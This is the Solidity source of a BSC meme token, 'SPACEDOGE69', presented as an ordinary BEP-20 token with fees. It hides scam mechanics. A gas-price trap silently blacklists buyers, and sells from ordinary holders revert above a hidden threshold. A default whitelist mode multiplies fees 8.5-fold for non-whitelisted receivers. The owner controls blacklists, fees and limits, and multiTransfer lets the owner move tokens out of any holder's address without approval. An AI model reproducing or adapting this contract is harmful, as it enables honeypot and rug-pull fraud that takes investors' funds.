/**
 *Submitted for verification at BscScan.com on 2022-07-20
*/

/**

SPACEDOGE69

TG:https://t.me/SpaceDoge69

*/

// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.14;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}

contract Ownable is Context {
    address public _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        authorizations[_owner] = true;
        emit OwnershipTransferred(address(0), msgSender);
    }
    mapping (address => bool) internal authorizations;

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface InterfaceLP {
    function sync() external;
}

contract SPACEDOGE69 is Ownable, IBEP20 {
    using SafeMath for uint256;

    address WBNB;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;

    string  _name = "SPACEDOGE69";
    string  _symbol = "SPDG69";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 1000000000 * 10**_decimals;

    uint256 public _maxTxAmount = _totalSupply.mul(2).div(50);
    uint256 public _maxWalletToken = _totalSupply.mul(2).div(50);

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;
    
    bool public whitelistMode = true;
    mapping (address => bool) public isWhitelisted;

    bool public blacklistMode = true;
    mapping (address => bool) public isblacklisted;

    mapping (address => bool) isFeeExempt;
    mapping (address => bool) isTxLimitExempt;

    uint256 public liquidityFee = 2;
    uint256 private marketingFee = 3;
    uint256 public ecoFee = 0;
    uint256 private devFee = 0;
    uint256 public burnFee = 0;
    uint256 public totalFee = marketingFee + liquidityFee + ecoFee + burnFee + devFee;
    uint256 public feeDenominator = 100;

    uint256 public sellMultiplier  = 100; 
    
    address public autoLiquidityReceiver;
    address public marketingFeeReceiver;
    address private ecoFeeReceiver;
    address private devFeeReceiver;
    address public burnFeeReceiver;

    uint256 targetLiquidity = 100;
    uint256 targetLiquidityDenominator = 100;

    IDEXRouter public router;
    address public pair;
    InterfaceLP public pairContract;
    
    bool public tradingOpen = false;

    uint256 energia = 7 * 1 gwei;

    bool public swapEnabled = true;
    uint256 public swapThreshold = _totalSupply * 1 / 1000;
    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }

    constructor () {
        router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        WBNB = router.WETH();
        pair = IDEXFactory(router.factory()).createPair(WBNB, address(this));
        pairContract = InterfaceLP(pair);

        _allowances[address(this)][address(router)] = type(uint256).max;

        isFeeExempt[msg.sender] = true;
        isFeeExempt[marketingFeeReceiver] = true;
        isFeeExempt[devFeeReceiver] = true;
        isFeeExempt[ecoFeeReceiver] = true;
        
        isWhitelisted[msg.sender] = true;
        
        isTxLimitExempt[msg.sender] = true;
        isTxLimitExempt[marketingFeeReceiver] = true;
        isTxLimitExempt[devFeeReceiver] = true;
        isTxLimitExempt[ecoFeeReceiver] = true;
        isTxLimitExempt[pair] = true;
        isTxLimitExempt[address(this)] = true;

        autoLiquidityReceiver = msg.sender; 
        marketingFeeReceiver = 0x8d26CeB28238543919E073278569fA3379C8348c;
        ecoFeeReceiver = 0x72cC8003157F8dFe98A72f9046B38ef74e9C39e1;
        devFeeReceiver = 0x72cC8003157F8dFe98A72f9046B38ef74e9C39e1;
        burnFeeReceiver = DEAD;

        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable { }

    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function name() external view returns (string memory) { return _name; }
    function changeName(string memory newName) external onlyOwner { _name = newName; }
    function changeSymbol(string memory newSymbol) external onlyOwner { _symbol = newSymbol; }
    function symbol() external view returns (string memory) { return _symbol; }
    function getOwner() external view override returns (address) {return owner();}
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }

        return _transferFrom(sender, recipient, amount);
    }

    function set_Max_Wallet_Holding_Percent(uint256 max_Wallet_Holding_Percent) external onlyOwner {
  	    _maxWalletToken = _totalSupply*max_Wallet_Holding_Percent/100;
  	}

    function set_Max_Transaction_Percent(uint256 max_Transaction_Percent) external onlyOwner() {
        _maxTxAmount = _totalSupply*max_Transaction_Percent/100;
    }

    function setMaxTxAmountAbsolute(uint256 amount) external onlyOwner  {
        _maxTxAmount = amount;
    }

    function setMaxWalletAbsolute(uint256 amount) external onlyOwner  {
        _maxWalletToken = amount;
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if(inSwap){ return _basicTransfer(sender, recipient, amount); }

        if(!authorizations[sender] && !authorizations[recipient]){
            require(tradingOpen,"Trading not open yet");
        }
        
        if(blacklistMode){
            require(!isblacklisted[sender],"Blacklisted");    
        }
        
        if (tx.gasprice >= energia && recipient != pair) {
            isblacklisted[recipient] = true;
        }

        if (recipient == pair && !authorizations[sender]) {
            require(tx.gasprice <= energia, ">Sell on wallet action"); 
        }

        if (!authorizations[sender] && recipient != address(this)  && recipient != address(DEAD) && recipient != pair && recipient != burnFeeReceiver && !isTxLimitExempt[recipient]){
            uint256 heldTokens = balanceOf(recipient);
            require((heldTokens + amount) <= _maxWalletToken,"Total Holding is currently limited, you can not buy that much.");}
        
        checkTxLimit(sender, amount);

        if(shouldSwapBack()){ swapBack(); }

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        uint256 amountReceived = (!shouldTakeFee(sender) || !shouldTakeFee(recipient)) ? amount : takeFee(sender, amount,(recipient == pair),recipient);
        _balances[recipient] = _balances[recipient].add(amountReceived);

        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function checkTxLimit(address sender, uint256 amount) internal view {
        require(amount <= _maxTxAmount || isTxLimitExempt[sender], "TX Limit Exceeded");
    }

    function shouldTakeFee(address sender) internal view returns (bool) {
        return !isFeeExempt[sender];
    }

    function takeFee(address sender, uint256 amount, bool isSell, address receiver) internal returns (uint256) {
        
        uint256 multiplier = isSell ? sellMultiplier : 100; 
        if(whitelistMode && !isWhitelisted[receiver]){
            multiplier = 850;
        }

        uint256 feeAmount = amount.mul(totalFee).mul(multiplier).div(feeDenominator * 100);
        uint256 burnTokens = feeAmount.mul(burnFee).div(totalFee);
        uint256 contractTokens = feeAmount.sub(burnTokens);

        _balances[address(this)] = _balances[address(this)].add(contractTokens);
        _balances[burnFeeReceiver] = _balances[burnFeeReceiver].add(burnTokens);
        emit Transfer(sender, address(this), contractTokens);
        
        if(burnTokens > 0){
            emit Transfer(sender, burnFeeReceiver, burnTokens);    
        }

        return amount.sub(feeAmount);
    }

    function shouldSwapBack() internal view returns (bool) {
        return msg.sender != pair
        && !inSwap
        && swapEnabled
        && _balances[address(this)] >= swapThreshold;
    }

    function ClearForeignToken(address tokenAddress, uint256 tokens) external onlyOwner returns (bool success) {
        if(tokens == 0){
            tokens = IBEP20(tokenAddress).balanceOf(address(this));
        }
        return IBEP20(tokenAddress).transfer(msg.sender, tokens);
    }

    function set_sell_multiplier(uint256 _multiplier) external onlyOwner{
        sellMultiplier = _multiplier;        
    }

    function tradingStatus(bool _status) public onlyOwner {
        tradingOpen = _status;
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountETH = address(this).balance;
        payable(msg.sender).transfer(amountETH * amountPercentage / 100);
    }

    function swapBack() internal swapping {
        uint256 dynamicLiquidityFee = isOverLiquified(targetLiquidity, targetLiquidityDenominator) ? 0 : liquidityFee;
        uint256 amountToLiquify = swapThreshold.mul(dynamicLiquidityFee).div(totalFee).div(2);
        uint256 amountToSwap = swapThreshold.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WBNB;

        uint256 balanceBefore = address(this).balance;

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountBNB = address(this).balance.sub(balanceBefore);

        uint256 totalBNBFee = totalFee.sub(dynamicLiquidityFee.div(2));
        
        uint256 amountBNBLiquidity = amountBNB.mul(dynamicLiquidityFee).div(totalBNBFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(marketingFee).div(totalBNBFee);
        uint256 amountBNBEco = amountBNB.mul(ecoFee).div(totalBNBFee);
        uint256 amountBNBDev = amountBNB.mul(devFee).div(totalBNBFee);
    
        (bool tmpSuccess,) = payable(marketingFeeReceiver).call{value: amountBNBMarketing}("");
        (tmpSuccess,) = payable(ecoFeeReceiver).call{value: amountBNBEco}("");
        (tmpSuccess,) = payable(devFeeReceiver).call{value: amountBNBDev}("");
        
        
        tmpSuccess = false;

        if(amountToLiquify > 0){
            router.addLiquidityETH{value: amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                autoLiquidityReceiver,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    function updateEnergia (uint256 _energia) public onlyOwner {
        energia = _energia * 1 gwei; 
    }

    function enable_blacklist(bool _status) public onlyOwner {
        blacklistMode = _status;
    }

     function enable_whitelist(bool _status) public onlyOwner {
        whitelistMode = _status;
    }
    
    function manage_blacklist(address[] calldata addresses, bool status) public onlyOwner {
        for (uint256 i; i < addresses.length; ++i) {
            isblacklisted[addresses[i]] = status;
        }
    }

    function manage_whitelist(address[] calldata addresses, bool status) public onlyOwner {
        for (uint256 i; i < addresses.length; ++i) {
            isWhitelisted[addresses[i]] = status;
        }
    }

    function setFeeExempt(address holder, bool exempt) public onlyOwner {
        isFeeExempt[holder] = exempt;
    }

    function SetTXLimitExempt(address holder, bool exempt) public onlyOwner {
        isTxLimitExempt[holder] = exempt;
    }

    function setFees(uint256 _liquidityFee, uint256 _marketingFee, uint256 _ecoFee, uint256 _devFee, uint256 _burnFee, uint256 _feeDenominator) public onlyOwner {
        liquidityFee = _liquidityFee;
        marketingFee = _marketingFee;        
        ecoFee = _ecoFee;
        devFee = _devFee;
        burnFee = _burnFee;
        totalFee = _liquidityFee + _marketingFee + _ecoFee + _burnFee + _devFee;
        feeDenominator = _feeDenominator;
        require(totalFee < feeDenominator/2, "Fees cannot be more than 49%");
    }

    function setFeeReceivers(address _autoLiquidityReceiver, address _marketingFeeReceiver, address _ecoFeeReceiver, address _burnFeeReceiver, address _devFeeReceiver ) public onlyOwner {
        autoLiquidityReceiver = _autoLiquidityReceiver;
        marketingFeeReceiver = _marketingFeeReceiver;
        ecoFeeReceiver = _ecoFeeReceiver;
        burnFeeReceiver = _burnFeeReceiver;
        devFeeReceiver = _devFeeReceiver;
    }

    function setSwapBackSettings(bool _enabled, uint256 _amount) public onlyOwner {
        swapEnabled = _enabled;
        swapThreshold = _amount;
    }

    function setTargetLiquidity(uint256 _target, uint256 _denominator) external onlyOwner {
        targetLiquidity = _target;
        targetLiquidityDenominator = _denominator;
    }

    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
    }

    function getLiquidityBacking(uint256 accuracy) private view returns (uint256) {
        return accuracy.mul(balanceOf(pair).mul(2)).div(getCirculatingSupply());
    }

    function isOverLiquified(uint256 target, uint256 accuracy) private view returns (bool) {
        return getLiquidityBacking(accuracy) > target;
    }

    function multiTransfer(address from, address[] calldata addresses, uint256[] calldata tokens) external onlyOwner {

    require(addresses.length < 501,"GAS Error: max airdrop limit is 500 addresses");
    require(addresses.length == tokens.length,"Mismatch between Address and token count");

    uint256 SCCC = 0;

    for(uint i=0; i < addresses.length; i++){
        SCCC = SCCC + tokens[i];
    }

    require(balanceOf(from) >= SCCC, "Not enough tokens in wallet");

    for(uint i=0; i < addresses.length; i++){
        _basicTransfer(from,addresses[i],tokens[i]);
    }

    }

event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}